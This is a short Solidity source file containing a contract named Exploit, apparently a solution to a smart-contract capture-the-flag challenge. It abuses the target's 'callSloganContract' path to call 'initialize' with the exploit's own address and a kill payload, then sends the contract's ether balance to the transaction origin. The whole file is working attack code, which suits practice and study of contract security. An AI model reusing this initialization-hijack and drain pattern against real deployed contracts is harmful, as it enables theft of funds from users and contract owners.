// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./Challenge.sol";
import "hardhat/console.sol";

contract Exploit {
    Challenge instance;

    constructor(Challenge _instance) payable {
        instance = _instance;
    }

    function finalize() external {
        bytes memory data = abi.encodeWithSignature(
            "initialize(address,bytes)",
            address(this),
            abi.encodeWithSelector(Exploit.kill.selector)
        );

        instance.callSloganContract(data);
    }

    function kill() external {
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {
        payable(tx.origin).transfer(address(this).balance);
    }
}
